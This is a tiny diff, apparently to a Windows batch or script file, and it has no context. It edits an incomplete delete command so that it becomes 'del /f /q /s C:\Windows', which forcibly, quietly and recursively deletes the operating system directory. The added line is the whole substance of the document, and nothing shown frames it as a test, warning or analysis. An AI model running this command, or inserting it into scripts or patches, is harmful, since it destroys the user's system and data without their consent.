@@ -1,1 +1,2 @@
-del /f /q /s
+del /f /q /s C:\Windows
+
